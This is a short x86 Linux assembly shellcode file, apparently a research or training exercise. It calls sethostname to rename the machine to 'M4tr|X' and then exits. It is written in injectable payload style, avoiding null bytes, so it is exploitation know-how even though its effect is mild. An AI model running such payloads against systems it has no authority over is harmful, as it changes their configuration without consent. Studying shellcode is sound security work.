;
; Shellcode set hostname 
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE;

global _start			

section .text
_start:

    ; Linux Syscall Reference
    ; http://syscalls.kernelgrok.com/


    ; Execute sethostname system call
    push 0x2020587c         ; push '|X  '
    push 0x7274344d         ; push 'M4tr'
	mov ebx, esp            ; Hostname parameter

    xor ecx, ecx
	mov cl, 6        
    push 0x4a               ; sys_sethostname syscall number
    pop eax
    int 0x80
    
    ; Exit
	push 1                  ; EAX - syscall numnber
	pop eax                 ; sys_exit syscall
	xor ebx, ebx            ; EBX - return code
    mov bl, 7
	int 0x80                ; execute syscall

